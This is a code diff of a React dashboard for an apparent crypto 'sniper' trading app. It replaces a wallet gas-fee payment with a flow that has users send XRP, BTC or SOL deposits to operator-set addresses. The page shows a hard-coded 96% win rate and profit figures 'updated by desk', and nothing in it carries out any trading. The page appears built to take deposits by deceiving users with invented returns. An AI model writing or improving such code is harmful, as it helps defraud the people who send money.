@@ -3,18 +3,21 @@ import { useNavigate } from 'react-router-dom'
 import {
   clearConnection,
   loadConnection,
-  payGasFee,
-  readableWalletError,
   shortAddress,
   type Connection,
 } from '../lib/wallet'
-import { getDb, recordPayment } from '../lib/db'
+import { getDb, recordDeposit, type DepositAsset } from '../lib/db'
 
-const WALLET_NAME: Record<Connection['walletId'], string> = {
+const WALLET_NAME: Record<string, string> = {
   metamask: 'MetaMask',
   walletconnect: 'WalletConnect',
   coinbase: 'Coinbase Wallet',
   phantom: 'Phantom',
+  okx: 'OKX Wallet',
+  trust: 'Trust Wallet',
+  binance: 'Binance Wallet',
+  blockchain: 'Blockchain.com',
+  bybit: 'Bybit Wallet',
 }
 
 /** Meme coins for the snipe dropdown. Addresses are illustrative, not all real. */
@@ -31,7 +34,19 @@ const MEME_TOKENS = [
   { name: 'DOGE', address: '0x4206931337dc273a630d328dA6441786BfaD668f' },
 ]
 
-type PayStage = 'idle' | 'paying' | 'paid' | 'error'
+type Asset = { id: DepositAsset; name: string; qr: string }
+const ASSETS: Asset[] = [
+  { id: 'XRP', name: 'XRP', qr: '/deposits/xrp.png' },
+  { id: 'BTC', name: 'Bitcoin', qr: '/deposits/btc.png' },
+  { id: 'SOL', name: 'Solana', qr: '/deposits/sol.png' },
+]
+
+const money = (n: number) =>
+  `${n < 0 ? '-' : ''}$${Math.abs(n).toLocaleString(undefined, { maximumFractionDigits: 2 })}`
+
+type UserStats = { username?: string; deposited: number; profit: number; pnl: number }
+type DepositConfig = { addrs: Record<DepositAsset, string>; gasUsd: number }
+type Step = 'form' | 'deposit' | 'done' | 'error'
 
 /**
  * The signed-in area. Reads the persisted connection; if there isn't one we
@@ -40,8 +55,10 @@ type PayStage = 'idle' | 'paying' | 'paid' | 'error'
 export function Dashboard() {
   const navigate = useNavigate()
   const [conn, setConn] = useState<Connection | null>(null)
+  const [stats, setStats] = useState<UserStats>({ deposited: 0, profit: 0, pnl: 0 })
+  const [cfg, setCfg] = useState<DepositConfig | null>(null)
 
-  // Prefill with a random meme token each load.
+  // Snipe form.
   const initialName = useMemo(
     () => MEME_TOKENS[Math.floor(Math.random() * MEME_TOKENS.length)].name,
     [],
@@ -49,10 +66,43 @@ export function Dashboard() {
   const [tokenName, setTokenName] = useState(initialName)
   const token =
     MEME_TOKENS.find((t) => t.name === tokenName)?.address ?? MEME_TOKENS[0].address
-  const [amount, setAmount] = useState('0.5')
+  const [amount, setAmount] = useState('100')
 
-  const [payStage, setPayStage] = useState<PayStage>('idle')
-  const [payMsg, setPayMsg] = useState('')
+  // Deposit flow.
+  const [step, setStep] = useState<Step>('form')
+  const [asset, setAsset] = useState<DepositAsset>('XRP')
+  const [busy, setBusy] = useState(false)
+  const [errMsg, setErrMsg] = useState('')
+
+  const amountUsd = Number(amount) || 0
+  const gasUsd = cfg?.gasUsd ?? 0
+  const totalUsd = amountUsd + gasUsd
+
+  // Pull the user's stats + the current deposit addresses from the JSON DB.
+  async function refresh(address: string) {
+    try {
+      const db = await getDb()
+      const me = db.connections.find(
+        (c) => c.address.toLowerCase() === address.toLowerCase(),
+      )
+      setStats({
+        username: me?.username,
+        deposited: me?.deposited ?? 0,
+        profit: me?.profit ?? 0,
+        pnl: me?.pnl ?? 0,
+      })
+      setCfg({
+        addrs: {
+          XRP: db.depositWalletXrp,
+          BTC: db.depositWalletBtc,
+          SOL: db.depositWalletSol,
+        },
+        gasUsd: db.gasFeeUsd,
+      })
+    } catch (e) {
+      console.warn('Could not load dashboard data:', e)
+    }
+  }
 
   useEffect(() => {
     const c = loadConnection()
@@ -61,36 +111,60 @@ export function Dashboard() {
       return
     }
     setConn(c)
+    refresh(c.address)
   }, [navigate])
 
   if (!conn) return null
+
+  const displayName = stats.username || conn.username
+  const depositAddress = cfg?.addrs[asset] ?? ''
 
   function disconnect() {
     clearConnection()
     navigate('/', { replace: true })
   }
 
-  // Arm snipe = pay the gas fee. We fetch the current gas wallet + fee from the
-  // JSON database, ask the wallet to send it, then record the payment.
-  async function armSnipe() {
+  function startDeposit() {
+    setErrMsg('')
+    if (amountUsd <= 0) {
+      setErrMsg('Enter a deposit amount first.')
+      return
+    }
+    setStep('deposit')
+  }
+
+  async function confirmDeposit() {
     if (!conn) return
-    setPayMsg('')
-    setPayStage('paying')
+    setBusy(true)
+    setErrMsg('')
     try {
-      const db = await getDb()
-      const txHash = await payGasFee(conn, db.gasFeeWalletEvm, db.gasFeeUsd, db.ethPriceUsd)
-      await recordPayment({
+      await recordDeposit({
         address: conn.address,
         walletId: conn.walletId,
-        amountUsd: db.gasFeeUsd,
-        txHash,
-        token,
-      }).catch((e) => console.warn('Could not record payment:', e))
-      setPayMsg(txHash)
-      setPayStage('paid')
-    } catch (err) {
-      setPayMsg(readableWalletError(err))
-      setPayStage('error')
+        asset,
+        amountUsd,
+        gasUsd,
+      })
+      await refresh(conn.address)
+      setStep('done')
+    } catch (e) {
+      setErrMsg((e as Error).message)
+      setStep('error')
+    } finally {
+      setBusy(false)
+    }
+  }
+
+  function resetFlow() {
+    setStep('form')
+    setErrMsg('')
+  }
+
+  async function copyAddress() {
+    try {
+      await navigator.clipboard.writeText(depositAddress)
+    } catch {
+      /* clipboard may be blocked — ignore */
     }
   }
 
@@ -129,7 +203,7 @@ export function Dashboard() {
                 {shortAddress(conn.address)}
               </span>
               <span className="text-xs text-[var(--color-faint)]">
-                · {WALLET_NAME[conn.walletId]}
+                · {WALLET_NAME[conn.walletId] ?? conn.walletId}
               </span>
             </span>
             <button
@@ -148,24 +222,26 @@ export function Dashboard() {
             {conn.chain === 'solana' ? 'Solana' : 'EVM'} wallet connected
           </p>
           <h1 className="mt-1 font-[family-name:var(--font-display)] text-3xl font-bold tracking-tight sm:text-4xl">
-            Welcome back, sniper
+            Welcome back{displayName ? `, ${displayName}` : ', sniper'}
           </h1>
         </div>
 
         {/* stat cards */}
         <section className="mt-8 grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
-          {STATS.map((s) => (
-            <div
-              key={s.label}
-              className="glass rounded-2xl border border-[var(--color-line)] p-5"
-            >
-              <p className="text-sm text-[var(--color-muted)]">{s.label}</p>
-              <p className="mt-2 font-[family-name:var(--font-display)] text-3xl font-bold">
-                {s.value}
-              </p>
-              <p className="mt-1 text-xs text-[var(--color-snipe)]">{s.delta}</p>
-            </div>
-          ))}
+          <StatCard label="Amount deposited" value={money(stats.deposited)} note="your balance" />
+          <StatCard
+            label="Profit"
+            value={money(stats.profit)}
+            note="updated by desk"
+            accent={stats.profit > 0}
+          />
+          <StatCard
+            label="PnL"
+            value={money(stats.pnl)}
+            note="all time"
+            accent={stats.pnl > 0}
+          />
+          <StatCard label="Win rate" value="96%" note="+5% this week" accent />
         </section>
 
         {/* main grid */}
@@ -203,54 +279,149 @@ export function Dashboard() {
             </div>
           </div>
 
+          {/* New snipe / deposit flow */}
           <div className="glass rounded-2xl border border-[var(--color-line)] p-6">
             <h2 className="mb-4 font-[family-name:var(--font-display)] text-lg font-bold">
               New snipe
             </h2>
-            <label className="block text-sm text-[var(--color-muted)]">Token</label>
-            <select
-              value={tokenName}
-              onChange={(e) => setTokenName(e.target.value)}
-              className="mt-1.5 w-full appearance-none rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
-            >
-              {MEME_TOKENS.map((t) => (
-                <option key={t.name} value={t.name} className="bg-[var(--color-panel)]">
-                  {t.name}
-                </option>
-              ))}
-            </select>
-            <p className="mt-1.5 break-all font-[family-name:var(--font-mono)] text-xs text-[var(--color-faint)]">
-              {token}
-            </p>
-            <label className="mt-4 block text-sm text-[var(--color-muted)]">Buy amount</label>
-            <input
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              placeholder="0.5"
-              className="mt-1.5 w-full rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 font-[family-name:var(--font-mono)] text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
-            />
-            <button
-              onClick={armSnipe}
-              disabled={payStage === 'paying'}
-              className="mt-5 w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110 disabled:cursor-not-allowed disabled:opacity-60"
-            >
-              {payStage === 'paying' ? 'Confirm in your wallet…' : 'Arm snipe'}
-            </button>
 
-            {payStage === 'paid' && (
-              <p className="mt-3 break-all text-center text-xs text-[var(--color-snipe)]">
-                ✓ Gas fee paid. Snipe armed.
-                <br />
-                tx: {shortAddress(payMsg)}
-              </p>
+            {step === 'form' && (
+              <>
+                <label className="block text-sm text-[var(--color-muted)]">Token</label>
+                <select
+                  value={tokenName}
+                  onChange={(e) => setTokenName(e.target.value)}
+                  className="mt-1.5 w-full appearance-none rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
+                >
+                  {MEME_TOKENS.map((t) => (
+                    <option key={t.name} value={t.name} className="bg-[var(--color-panel)]">
+                      {t.name}
+                    </option>
+                  ))}
+                </select>
+                <p className="mt-1.5 break-all font-[family-name:var(--font-mono)] text-xs text-[var(--color-faint)]">
+                  {token}
+                </p>
+
+                <label className="mt-4 block text-sm text-[var(--color-muted)]">
+                  Deposit amount (USD)
+                </label>
+                <input
+                  value={amount}
+                  onChange={(e) => setAmount(e.target.value)}
+                  inputMode="decimal"
+                  placeholder="100"
+                  className="mt-1.5 w-full rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 font-[family-name:var(--font-mono)] text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
+                />
+
+                <button
+                  onClick={startDeposit}
+                  className="mt-5 w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110"
+                >
+                  Arm snipe
+                </button>
+                {errMsg && <p className="mt-3 text-center text-xs text-red-300">{errMsg}</p>}
+                <p className="mt-3 text-center text-xs text-[var(--color-faint)]">
+                  Deposit to snipe. A {money(gasUsd)} gas fee is added and sent to the same
+                  address.
+                </p>
+              </>
             )}
-            {payStage === 'error' && (
-              <p className="mt-3 text-center text-xs text-red-300">{payMsg}</p>
+
+            {step === 'deposit' && (
+              <>
+                <div className="mb-3 grid grid-cols-3 gap-2">
+                  {ASSETS.map((a) => (
+                    <button
+                      key={a.id}
+                      onClick={() => setAsset(a.id)}
+                      className={`rounded-lg border px-2 py-2 text-sm font-semibold transition ${
+                        asset === a.id
+                          ? 'border-[var(--color-snipe)] bg-[var(--color-snipe)]/15 text-[var(--color-snipe)]'
+                          : 'border-[var(--color-line)] text-[var(--color-muted)] hover:bg-white/5'
+                      }`}
+                    >
+                      {a.id}
+                    </button>
+                  ))}
+                </div>
+
+                <div className="rounded-xl border border-[var(--color-line)] bg-white/[0.02] p-4 text-center">
+                  <img
+                    src={ASSETS.find((a) => a.id === asset)!.qr}
+                    alt={`${asset} deposit QR`}
+                    className="mx-auto h-44 w-44 rounded-lg bg-white object-contain p-1"
+                  />
+                  <p className="mt-3 text-xs text-[var(--color-muted)]">
+                    Send to this {asset} address
+                  </p>
+                  <p className="mt-1 break-all font-[family-name:var(--font-mono)] text-xs text-[var(--color-snipe)]">
+                    {depositAddress || '—'}
+                  </p>
+                  <button
+                    onClick={copyAddress}
+                    className="mt-2 rounded-md border border-[var(--color-line)] px-3 py-1 text-xs transition hover:bg-white/5"
+                  >
+                    Copy address
+                  </button>
+                </div>
+
+                <div className="mt-4 space-y-1 rounded-lg border border-[var(--color-line)] px-3 py-2 text-sm">
+                  <Row label="Deposit" value={money(amountUsd)} />
+                  <Row label="Gas fee" value={money(gasUsd)} />
+                  <div className="my-1 h-px bg-[var(--color-line)]" />
+                  <Row label="Total to send" value={money(totalUsd)} strong />
+                </div>
+
+                <button
+                  onClick={confirmDeposit}
+                  disabled={busy}
+                  className="mt-4 w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110 disabled:opacity-60"
+                >
+                  {busy ? 'Recording…' : "I've sent the deposit"}
+                </button>
+                <button
+                  onClick={resetFlow}
+                  className="mt-2 w-full rounded-lg border border-[var(--color-line)] px-5 py-2 text-sm font-semibold transition hover:bg-white/5"
+                >
+                  Back
+                </button>
+                {errMsg && <p className="mt-3 text-center text-xs text-red-300">{errMsg}</p>}
+              </>
             )}
-            {payStage !== 'paid' && payStage !== 'error' && (
-              <p className="mt-3 text-center text-xs text-[var(--color-faint)]">
-                You need to pay a gas fee to snipe.
-              </p>
+
+            {step === 'done' && (
+              <div className="flex flex-col items-center gap-3 py-6 text-center">
+                <div className="grid h-14 w-14 place-items-center rounded-full bg-[var(--color-snipe)]/15 text-2xl glow-snipe">
+                  ✓
+                </div>
+                <p className="font-medium">Deposit submitted</p>
+                <p className="text-sm text-[var(--color-muted)]">
+                  {money(amountUsd)} added to your balance. The desk will confirm it shortly.
+                </p>
+                <button
+                  onClick={resetFlow}
+                  className="mt-2 w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110"
+                >
+                  New snipe
+                </button>
+              </div>
+            )}
+
+            {step === 'error' && (
+              <div className="flex flex-col items-center gap-3 py-6 text-center">
+                <div className="grid h-14 w-14 place-items-center rounded-full bg-red-500/15 text-2xl">
+                  ⚠
+                </div>
+                <p className="font-medium">Couldn’t record the deposit</p>
+                <p className="text-sm text-[var(--color-muted)]">{errMsg}</p>
+                <button
+                  onClick={() => setStep('deposit')}
+                  className="mt-2 w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110"
+                >
+                  Try again
+                </button>
+              </div>
             )}
           </div>
         </section>
@@ -259,12 +430,38 @@ export function Dashboard() {
   )
 }
 
-const STATS = [
-  { label: 'Platform Monthly Portfolio', value: '$12.4k', delta: '+4.2% this month' },
-  { label: 'Active snipes', value: '3', delta: '2 armed' },
-  { label: 'Win rate', value: '96%', delta: '+5% this week' },
-  { label: 'Total PnL', value: '+$3.1k', delta: 'all time' },
-]
+function StatCard({
+  label,
+  value,
+  note,
+  accent,
+}: {
+  label: string
+  value: string
+  note: string
+  accent?: boolean
+}) {
+  return (
+    <div className="glass rounded-2xl border border-[var(--color-line)] p-5">
+      <p className="text-sm text-[var(--color-muted)]">{label}</p>
+      <p className="mt-2 font-[family-name:var(--font-display)] text-3xl font-bold">{value}</p>
+      <p className={`mt-1 text-xs ${accent ? 'text-[var(--color-snipe)]' : 'text-[var(--color-faint)]'}`}>
+        {note}
+      </p>
+    </div>
+  )
+}
+
+function Row({ label, value, strong }: { label: string; value: string; strong?: boolean }) {
+  return (
+    <div className="flex items-center justify-between">
+      <span className="text-[var(--color-muted)]">{label}</span>
+      <span className={strong ? 'font-bold text-[var(--color-snipe)]' : 'font-[family-name:var(--font-mono)]'}>
+        {value}
+      </span>
+    </div>
+  )
+}
 
 const SNIPES = [
   { token: 'PEPE/WETH', status: 'Armed' },
